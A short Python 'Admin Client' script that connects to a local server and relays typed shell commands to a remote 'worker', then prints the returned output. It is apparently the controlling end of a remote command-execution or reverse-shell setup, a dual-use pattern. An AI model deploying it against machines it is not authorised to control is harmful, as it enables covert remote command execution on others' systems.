import socket

# Admin Client configuration
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Create a socket object
s = socket.socket()
# Connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    # Get the command from the admin input
    command = input("Admin $> ")
    
    if command.strip().lower() == "exit":
        s.send(command.encode())  # Notify worker to exit
        break
    
    # Send the command to the server
    s.send(command.encode())
    
    # Receive the output from the worker (through server)
    output = s.recv(BUFFER_SIZE).decode()
    
    # Print the worker's output
    print(f"Worker Response:\n{output}")

# Close the connection when done
s.close()
